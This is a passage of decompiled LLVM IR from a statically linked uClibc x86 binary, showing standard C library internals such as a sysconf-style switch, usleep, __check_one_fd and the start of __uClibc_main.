    i32 19, label %dec_label_pc_805141d
    i32 20, label %dec_label_pc_805141d
    i32 21, label %dec_label_pc_805141d
    i32 22, label %dec_label_pc_805141d
    i32 23, label %dec_label_pc_805151c
    i32 24, label %dec_label_pc_805151c
    i32 25, label %dec_label_pc_8051528
    i32 26, label %dec_label_pc_80514f9
    i32 27, label %dec_label_pc_805151c
    i32 28, label %dec_label_pc_805146f
    i32 29, label %dec_label_pc_80514f2
    i32 30, label %dec_label_pc_8051467
    i32 31, label %dec_label_pc_8051507
    i32 32, label %dec_label_pc_805151c
    i32 33, label %dec_label_pc_805151c
    i32 34, label %dec_label_pc_805151c
    i32 35, label %dec_label_pc_8051500
    i32 36, label %dec_label_pc_805152f
    i32 37, label %dec_label_pc_8051536
    i32 38, label %dec_label_pc_805152f
    i32 39, label %dec_label_pc_8051479
    i32 40, label %dec_label_pc_805153d
    i32 41, label %dec_label_pc_805151c
    i32 42, label %dec_label_pc_8051507
    i32 43, label %dec_label_pc_8051536
    i32 44, label %dec_label_pc_8051544
    i32 45, label %dec_label_pc_8051536
    i32 46, label %dec_label_pc_80514f2
    i32 47, label %dec_label_pc_80514f2
    i32 48, label %dec_label_pc_80514f2
    i32 49, label %dec_label_pc_805151c
    i32 50, label %dec_label_pc_805151c
    i32 51, label %dec_label_pc_80514f2
    i32 52, label %dec_label_pc_80514f2
    i32 53, label %dec_label_pc_805151c
    i32 54, label %dec_label_pc_805151c
    i32 55, label %dec_label_pc_805151c
    i32 56, label %dec_label_pc_805151c
    i32 57, label %dec_label_pc_805151c
    i32 58, label %dec_label_pc_805151c
    i32 59, label %dec_label_pc_805151c
    i32 60, label %dec_label_pc_805151c
    i32 61, label %dec_label_pc_805151c
    i32 62, label %dec_label_pc_805151c
    i32 63, label %dec_label_pc_805151c
    i32 64, label %dec_label_pc_805151c
    i32 65, label %dec_label_pc_805151c
    i32 66, label %dec_label_pc_805151c
    i32 67, label %dec_label_pc_805141d
    i32 68, label %dec_label_pc_805141d
    i32 69, label %dec_label_pc_8051500
    i32 70, label %dec_label_pc_8051500
    i32 71, label %dec_label_pc_8051500
    i32 72, label %dec_label_pc_8051507
    i32 73, label %dec_label_pc_805150e
    i32 74, label %dec_label_pc_8051515
    i32 75, label %dec_label_pc_8051483
    i32 76, label %dec_label_pc_8051515
    i32 77, label %dec_label_pc_805141d
    i32 78, label %dec_label_pc_805141d
    i32 79, label %dec_label_pc_805141d
    i32 80, label %dec_label_pc_805141d
    i32 81, label %dec_label_pc_805141d
    i32 82, label %dec_label_pc_805141d
    i32 83, label %dec_label_pc_805141d
    i32 84, label %dec_label_pc_805141d
    i32 85, label %dec_label_pc_805151c
    i32 86, label %dec_label_pc_805151c
    i32 87, label %dec_label_pc_80514f9
    i32 88, label %dec_label_pc_805148d
    i32 89, label %dec_label_pc_8051497
    i32 90, label %dec_label_pc_805150e
    i32 91, label %dec_label_pc_805141d
    i32 92, label %dec_label_pc_805141d
    i32 93, label %dec_label_pc_805141d
    i32 94, label %dec_label_pc_805141d
    i32 95, label %dec_label_pc_80514f2
    i32 96, label %dec_label_pc_805151c
    i32 97, label %dec_label_pc_805151c
    i32 98, label %dec_label_pc_805141d
    i32 99, label %dec_label_pc_805141d
    i32 100, label %dec_label_pc_805141d
    i32 101, label %dec_label_pc_80514a1
    i32 102, label %dec_label_pc_80514e4
    i32 103, label %dec_label_pc_8051521
    i32 104, label %dec_label_pc_80514f9
    i32 105, label %dec_label_pc_80514ab
    i32 106, label %dec_label_pc_8051507
    i32 107, label %dec_label_pc_8051507
    i32 108, label %dec_label_pc_80514eb
    i32 109, label %dec_label_pc_8051528
    i32 110, label %dec_label_pc_8051544
    i32 111, label %dec_label_pc_80514e4
    i32 112, label %dec_label_pc_8051521
    i32 113, label %dec_label_pc_8051544
    i32 114, label %dec_label_pc_80514b5
    i32 115, label %dec_label_pc_805153d
    i32 116, label %dec_label_pc_805151c
    i32 117, label %dec_label_pc_805151c
    i32 118, label %dec_label_pc_80514bf
    i32 119, label %dec_label_pc_80514c9
    i32 120, label %dec_label_pc_8051536
    i32 121, label %dec_label_pc_80514f9
    i32 122, label %dec_label_pc_80514f9
    i32 123, label %dec_label_pc_80514f9
    i32 124, label %dec_label_pc_80514f9
    i32 125, label %dec_label_pc_805141d
    i32 126, label %dec_label_pc_805141d
    i32 127, label %dec_label_pc_805151c
    i32 128, label %dec_label_pc_805151c
    i32 129, label %dec_label_pc_805141d
    i32 130, label %dec_label_pc_805141d
    i32 131, label %dec_label_pc_805151c
    i32 149, label %dec_label_pc_80514d0
  ]

dec_label_pc_805141d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051427:                             ; preds = %entry
  %v1_8051427 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805142c = inttoptr i32 %v1_8051427 to i32*
  store i32 22, i32* %v1_805142c, align 4
  br label %dec_label_pc_805151c

dec_label_pc_8051437:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051441:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_805144b:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051455:                             ; preds = %entry
  %v0_8051458 = call i32 @getdtablesize()
  br label %dec_label_pc_805145d

dec_label_pc_805145d:                             ; preds = %entry, %dec_label_pc_8051455
  br label %dec_label_pc_8051549

dec_label_pc_8051467:                             ; preds = %entry
  %v3_805146a = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805146f

dec_label_pc_805146f:                             ; preds = %entry, %dec_label_pc_8051467
  br label %dec_label_pc_8051549

dec_label_pc_8051479:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051483:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_805148d:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051497:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514a1:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514ab:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514b5:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514bf:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514c9:                             ; preds = %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514d0:                             ; preds = %entry
  %v5_80514d6 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80514de = icmp slt i32 %v5_80514d6, 0
  %v1_80514e0 = icmp eq i1 %v2_80514de, false
  br i1 %v1_80514e0, label %dec_label_pc_80514f2, label %dec_label_pc_805151c

dec_label_pc_80514e4:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514eb:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_80514f2:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80514d0
  br label %dec_label_pc_8051549

dec_label_pc_80514f9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051500:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051507:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_805150e:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051515:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_805151c:                             ; preds = %dec_label_pc_80514d0, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051427
  br label %dec_label_pc_8051549

dec_label_pc_8051521:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051528:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_805152f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051536:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_805153d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051544:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051549

dec_label_pc_8051549:                             ; preds = %dec_label_pc_805153d, %dec_label_pc_8051536, %dec_label_pc_805152f, %dec_label_pc_8051528, %dec_label_pc_8051521, %dec_label_pc_8051515, %dec_label_pc_805150e, %dec_label_pc_8051507, %dec_label_pc_8051500, %dec_label_pc_80514f9, %dec_label_pc_80514eb, %dec_label_pc_80514e4, %dec_label_pc_80514f2, %dec_label_pc_80514c9, %dec_label_pc_80514bf, %dec_label_pc_80514b5, %dec_label_pc_80514ab, %dec_label_pc_80514a1, %dec_label_pc_8051497, %dec_label_pc_805148d, %dec_label_pc_8051483, %dec_label_pc_8051479, %dec_label_pc_805146f, %dec_label_pc_805145d, %dec_label_pc_805144b, %dec_label_pc_8051441, %dec_label_pc_8051437, %dec_label_pc_805141d, %dec_label_pc_805151c, %dec_label_pc_8051544
  %v0_805154c = phi i32 [ 255, %dec_label_pc_805153d ], [ 2048, %dec_label_pc_8051536 ], [ 99, %dec_label_pc_805152f ], [ 20, %dec_label_pc_8051528 ], [ -128, %dec_label_pc_8051521 ], [ 1024, %dec_label_pc_8051515 ], [ 4, %dec_label_pc_805150e ], [ 32, %dec_label_pc_8051507 ], [ 256, %dec_label_pc_8051500 ], [ 2147483647, %dec_label_pc_80514f9 ], [ 16, %dec_label_pc_80514eb ], [ 127, %dec_label_pc_80514e4 ], [ 200112, %dec_label_pc_80514f2 ], [ 9, %dec_label_pc_80514c9 ], [ 65535, %dec_label_pc_80514bf ], [ -32768, %dec_label_pc_80514b5 ], [ -2147483648, %dec_label_pc_80514ab ], [ 8, %dec_label_pc_80514a1 ], [ 500, %dec_label_pc_8051497 ], [ 4096, %dec_label_pc_805148d ], [ 16384, %dec_label_pc_8051483 ], [ 1000, %dec_label_pc_8051479 ], [ 32768, %dec_label_pc_805146f ], [ 6, %dec_label_pc_805145d ], [ 65536, %dec_label_pc_805144b ], [ 100, %dec_label_pc_8051441 ], [ 131072, %dec_label_pc_8051437 ], [ 1, %dec_label_pc_805141d ], [ -1, %dec_label_pc_805151c ], [ 32767, %dec_label_pc_8051544 ]
  ret i32 %v0_805154c

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 5, 1, 6, 0, 2, 3, 4 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 0 }
  uselistorder i32 13, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051549, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805151c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_80514f2, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805146f, { 1, 0 }
  uselistorder label %dec_label_pc_805145d, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051560 = and i64 %arg1, 4294967295
  %v8_8051560 = udiv i64 %v2_8051560, 1000000
  %v9_8051560 = trunc i64 %v8_8051560 to i32
  store i32 %v9_8051560, i32* %stack_var_-8, align 4
  %v2_8051577 = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8051577 = call i32 @__libc_nanosleep(%timespec* %v2_8051577, i32 0)
  ret i32 %v3_8051577

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051580 = load i32, i32* @ebx, align 4
  store i32 %v0_8051580, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), i32 0), label %dec_label_pc_8051594, label %dec_label_pc_80515a1

dec_label_pc_8051594:                             ; preds = %entry, %dec_label_pc_8051594
  %v1_805159b6 = phi i32 [ %v1_805159b, %dec_label_pc_8051594 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_805159b.259 to i32), i32* %stack_var_-16, align 4
  %v5_8051594 = mul i32 %v1_805159b6, 4
  %v6_8051594 = add i32 %v5_8051594, ptrtoint (i32* @global_var_8059128.258 to i32)
  %v7_8051594 = inttoptr i32 %v6_8051594 to i32*
  %v8_8051594 = load i32, i32* %v7_8051594, align 4
  call void @__pseudo_call(i32 %v8_8051594)
  %v0_805159b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805159b = add i32 %v0_805159b.pre, -1
  store i32 %v1_805159b, i32* %ebx.global-to-local, align 4
  %v10_805159c = icmp eq i32 %v0_805159b.pre, 0
  %v1_805159f = icmp eq i1 %v10_805159c, false
  br i1 %v1_805159f, label %dec_label_pc_8051594, label %dec_label_pc_80515a1

dec_label_pc_80515a1:                             ; preds = %dec_label_pc_8051594, %entry
  %v0_80515a1 = load i32, i32* @global_var_805fd54.260, align 4
  %v1_80515a6 = icmp eq i32 %v0_80515a1, 0
  br i1 %v1_80515a6, label %dec_label_pc_80515ac, label %dec_label_pc_80515aa

dec_label_pc_80515aa:                             ; preds = %dec_label_pc_80515a1
  %v0_80515aa = load i32, i32* %stack_var_-16, align 4
  %v1_80515aa = call i32 @unknown_0(i32 %v0_80515aa)
  br label %dec_label_pc_80515ac

dec_label_pc_80515ac:                             ; preds = %dec_label_pc_80515aa, %dec_label_pc_80515a1
  %v0_80515ac = load i32, i32* @global_var_805fd58.261, align 8
  %v1_80515b2 = icmp eq i32 %v0_80515ac, 0
  br i1 %v1_80515b2, label %dec_label_pc_80515bb, label %dec_label_pc_80515b6

dec_label_pc_80515b6:                             ; preds = %dec_label_pc_80515ac
  %v2_80515b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80515b8, i32* %ebx.global-to-local, align 4
  %v0_80515b9 = load i32, i32* %stack_var_-16, align 4
  %v1_80515b9 = call i32 @unknown_0(i32 %v0_80515b9)
  br label %dec_label_pc_80515bb

dec_label_pc_80515bb:                             ; preds = %dec_label_pc_80515ac, %dec_label_pc_80515b6
  %v2_80515bb = load i32, i32* %stack_var_-16, align 4
  %v2_80515bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80515bc, i32* @edx, align 4
  ret i32 %v2_80515bb

; uselistorder directives
  uselistorder i32 %v1_805159b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80515bb, { 1, 0 }
  uselistorder label %dec_label_pc_8051594, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80515c2 = load i32, i32* @eax, align 4
  ret i32 %v0_80515c2
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80515c3 = load i32, i32* @esi, align 4
  %v0_80515c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80515c4, i32* %stack_var_-8, align 4
  %v0_80515c8 = load i32, i32* @eax, align 4
  store i32 %v0_80515c8, i32* @esi, align 4
  %v0_80515ca = load i32, i32* @edx, align 4
  store i32 %v0_80515ca, i32* @ebx, align 4
  %v4_80515cf = call i32 @__libc_fcntl(i32 %v0_80515c8, i32 1, i32 %tmp6)
  %v8_80515d7 = icmp eq i32 %v4_80515cf, -1
  %v1_80515d8 = icmp eq i1 %v8_80515d7, false
  br i1 %v1_80515d8, label %dec_label_pc_80515f3, label %dec_label_pc_80515da

dec_label_pc_80515da:                             ; preds = %entry
  %v0_80515dc = load i32, i32* @ebx, align 4
  %v5_80515e2 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057ca0.262, i32 0, i32 0), i32 %v0_80515dc)
  %v1_80515ea = load i32, i32* @esi, align 4
  %v12_80515ea = icmp eq i32 %v5_80515e2, %v1_80515ea
  br i1 %v12_80515ea, label %dec_label_pc_80515f3, label %dec_label_pc_80515ee

dec_label_pc_80515ee:                             ; preds = %dec_label_pc_80515da
  %v0_80515ee = call i32 @abort()
  br label %dec_label_pc_80515f3

dec_label_pc_80515f3:                             ; preds = %dec_label_pc_80515da, %entry, %dec_label_pc_80515ee
  %v2_80515f3 = load i32, i32* %stack_var_-12, align 4
  %v2_80515f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80515f4, i32* @ebx, align 4
  store i32 %v0_80515c3, i32* @esi, align 4
  ret i32 %v2_80515f3

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_80515f3, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_80515fa = load i8, i8* @global_var_805fd5c.263, align 4
  %v1_80515fa = icmp eq i8 %v0_80515fa, 0
  %v1_8051601 = icmp eq i1 %v1_80515fa, false
  br i1 %v1_8051601, label %entry.dec_label_pc_8051633_crit_edge, label %dec_label_pc_8051603

entry.dec_label_pc_8051633_crit_edge:             ; preds = %entry
  %v0_8051636.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051633

dec_label_pc_8051603:                             ; preds = %entry
  store i8 1, i8* @global_var_805fd5c.263, align 4
  store i32 4096, i32* @global_var_805fd50.188, align 16
  %v0_805162e = call i32 @_stdio_init()
  br label %dec_label_pc_8051633

dec_label_pc_8051633:                             ; preds = %entry.dec_label_pc_8051633_crit_edge, %dec_label_pc_8051603
  %v0_8051636 = phi i32 [ %v0_8051636.pre, %entry.dec_label_pc_8051633_crit_edge ], [ %v0_805162e, %dec_label_pc_8051603 ]
  ret i32 %v0_8051636

; uselistorder directives
  uselistorder i8* @global_var_805fd5c.263, { 1, 0 }
  uselistorder label %dec_label_pc_8051633, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805fd48.264, align 8
  store i32 %arg6, i32* @global_var_805fd58.261, align 8
  %v2_805166e = mul i32 %arg2, 4
  %v3_805166e = add i32 %tmp31, %v2_805166e
  %v1_8051671 = add i32 %v3_805166e, 4
  store i32 %v1_8051671, i32* @global_var_805fd4c.256, align 4
  %v3_8051679 = load i32, i32* %arg3, align 4
  %v14_8051679 = icmp eq i32 %v1_8051671, %v3_8051679
  %v1_805167b = icmp eq i1 %v14_8051679, false
  br i1 %v1_805167b, label %dec_label_pc_8051683, label %dec_label_pc_805167d

dec_label_pc_805167d:                             ; preds = %entry
  store i32 %v3_805166e, i32* @global_var_805fd4c.256, align 4
  br label %dec_label_pc_8051683

dec_label_pc_8051683:                             ; preds = %entry, %dec_label_pc_805167d
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8051688 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805168d = bitcast i32* %stack_var_-136 to i8*
  %v4_805168d = call i32 @__GI_memset(i8* %v3_805168d, i32 0, i32 120)
  %v0_8051692 = load i32, i32* @global_var_805fd4c.256, align 4
  br label %dec_label_pc_805169a

dec_label_pc_805169a:                             ; preds = %dec_label_pc_805169a, %dec_label_pc_8051683
  %v0_805169a = phi i32 [ %v1_805169d, %dec_label_pc_805169a ], [ %v0_8051692, %dec_label_pc_8051683 ]
  %v1_805169a = inttoptr i32 %v0_805169a to i32*
  %v2_805169a = load i32, i32* %v1_805169a, align 4
  %v3_805169a = icmp eq i32 %v2_805169a, 0
  %v1_805169d = add i32 %v0_805169a, 4
  %v1_80516a0 = icmp eq i1 %v3_805169a, false
  br i1 %v1_80516a0, label %dec_label_pc_805169a, label %dec_label_pc_80516c1.preheader

dec_label_pc_80516c1.preheader:                   ; preds = %dec_label_pc_805169a
  store i32 %v1_805169d, i32* @ebx, align 4
  %v1_80516c11 = inttoptr i32 %v1_805169d to i32*
  %v2_80516c12 = load i32, i32* %v1_80516c11, align 4
  %v3_80516c13 = icmp eq i32 %v2_80516c12, 0
  %v1_80516c410 = icmp eq i1 %v3_80516c13, false
  br i1 %v1_80516c410, label %dec_label_pc_80516a6.lr.ph, label %dec_label_pc_80516c6

dec_label_pc_80516a6.lr.ph:                       ; preds = %dec_label_pc_80516c1.preheader
  %v3_8051686 = ptrtoint i32* %stack_var_-168 to i32
  %v3_80516b1 = add i32 %v3_8051686, 32
  br label %dec_label_pc_80516a6

dec_label_pc_80516a6:                             ; preds = %dec_label_pc_80516a6.lr.ph, %dec_label_pc_80516be
  %v1_80516b1 = phi i32 [ %v2_80516c12, %dec_label_pc_80516a6.lr.ph ], [ %v2_80516c1, %dec_label_pc_80516be ]
  %v0_80516b0 = phi i32 [ %v1_805169d, %dec_label_pc_80516a6.lr.ph ], [ %v1_80516be, %dec_label_pc_80516be ]
  %v6_80516ab = icmp ugt i32 %v1_80516b1, 14
  br i1 %v6_80516ab, label %dec_label_pc_80516be, label %dec_label_pc_80516ad

dec_label_pc_80516ad:                             ; preds = %dec_label_pc_80516a6
  store i32 %v0_80516b0, i32* %stack_var_-168, align 4
  %v2_80516b1 = mul i32 %v1_80516b1, 8
  %v4_80516b1 = add i32 %v3_80516b1, %v2_80516b1
  %v3_80516b6 = inttoptr i32 %v4_80516b1 to i16*
  %v4_80516b6 = call i32 @memcpy(i16* %v3_80516b6, i32 %v0_80516b0, i32 8)
  %v0_80516be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80516be

dec_label_pc_80516be:                             ; preds = %dec_label_pc_80516a6, %dec_label_pc_80516ad
  %v0_80516be = phi i32 [ %v0_80516b0, %dec_label_pc_80516a6 ], [ %v0_80516be.pre, %dec_label_pc_80516ad ]
  %v1_80516be = add i32 %v0_80516be, 8
  store i32 %v1_80516be, i32* @ebx, align 4
  %v1_80516c1 = inttoptr i32 %v1_80516be to i32*
  %v2_80516c1 = load i32, i32* %v1_80516c1, align 4
  %v3_80516c1 = icmp eq i32 %v2_80516c1, 0
  %v1_80516c4 = icmp eq i1 %v3_80516c1, false
  br i1 %v1_80516c4, label %dec_label_pc_80516a6, label %dec_label_pc_80516c6

dec_label_pc_80516c6:                             ; preds = %dec_label_pc_80516be, %dec_label_pc_80516c1.preheader
  store i32 %v2_8051688, i32* @eax, align 4
  %v0_80516ca = call i32 @_dl_aux_init()
  store i32 %v0_80516ca, i32* @eax, align 4
  %v0_80516cf = call i32 @__GI___uClibc_init()
  %v1_80516d8 = icmp eq i32 %tmp26, 0
  %v1_80516da = icmp eq i1 %v1_80516d8, false
  br i1 %v1_80516da, label %dec_label_pc_80516e0, label %dec_label_pc_80516dc

dec_label_pc_80516dc:                             ; preds = %dec_label_pc_80516c6
  %v1_80516dc = and i32 %tmp26, -65536
  %v2_80516dc = or i32 %v1_80516dc, 4096
  br label %dec_label_pc_80516e0

dec_label_pc_80516e0:                             ; preds = %dec_label_pc_80516c6, %dec_label_pc_80516dc
  %v0_80516e0 = phi i32 [ %tmp26, %dec_label_pc_80516c6 ], [ %v2_80516dc, %dec_label_pc_80516dc ]
  store i32 %v0_80516e0, i32* @global_var_805fd50.188, align 16
  %v13_80516e5 = icmp eq i32 %tmp25, -1
  %v1_80516ea = icmp eq i1 %v13_80516e5, false
  br i1 %v1_80516ea, label %dec_label_pc_8051715, label %dec_label_pc_80516ec

dec_label_pc_80516ec:                             ; preds = %dec_label_pc_80516e0
  %v0_80516ec = call i32 @getuid()
  store i32 %v0_80516ec, i32* @ebx, align 4
  %v0_80516f3 = call i32 @geteuid()
  %v0_80516f8 = load i32, i32* @ebx, align 4
  %v12_80516f8 = icmp eq i32 %v0_80516f8, %v0_80516f3
  %v1_80516fa = icmp eq i1 %v12_80516f8, false
  br i1 %v1_80516fa, label %dec_label_pc_805172b, label %dec_label_pc_80516fc

dec_label_pc_80516fc:                             ; preds = %dec_label_pc_80516ec
  %v0_80516fc = call i32 @getgid()
  store i32 %v0_80516fc, i32* @ebx, align 4
  %v0_8051703 = call i32 @getegid()
  %v0_8051708 = load i32, i32* @ebx, align 4
  %v12_8051708 = icmp eq i32 %v0_8051708, %v0_8051703
  %v1_805170a = icmp eq i1 %v12_8051708, false
  br i1 %v1_805170a, label %dec_label_pc_805172b, label %dec_label_pc_805170c.thread

dec_label_pc_805170c.thread:                      ; preds = %dec_label_pc_80516fc
  br label %dec_label_pc_8051755

dec_label_pc_8051715:                             ; preds = %dec_label_pc_80516e0
  %v15_8051715 = icmp eq i32 %tmp25, %tmp24
  %v1_8051719 = icmp eq i1 %v15_8051715, false
  br i1 %v1_8051719, label %dec_label_pc_805172b, label %dec_label_pc_805171b

dec_label_pc_805171b:                             ; preds = %dec_label_pc_8051715
  br label %dec_label_pc_805172b

dec_label_pc_805172b:                             ; preds = %dec_label_pc_805171b, %dec_label_pc_8051715, %dec_label_pc_80516fc, %dec_label_pc_80516ec
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051732 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051741 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051750 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051755

dec_label_pc_8051755:                             ; preds = %dec_label_pc_805170c.thread, %dec_label_pc_805172b
  store i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32* %esi.global-to-local, align 4
  %v0_805175a = load i32, i32* @edi, align 4
  %v1_805175a = inttoptr i32 %v0_805175a to i32*
  %v2_805175a = load i32, i32* %v1_805175a, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32* %esi.global-to-local, align 4
  store i32 %v2_805175a, i32* inttoptr (i32 134585016 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582568), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_805fd54.260, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8059128.258 to i32), i32 -134582565), i32 6), label %dec_label_pc_805177a, label %dec_label_pc_8051786

dec_label_pc_805177a:                             ; preds = %dec_label_pc_8051755, %dec_label_pc_805177a
  %v4_805177a47 = phi i32 [ %v1_8051781, %dec_label_pc_805177a ], [ 0, %dec_label_pc_8051755 ]
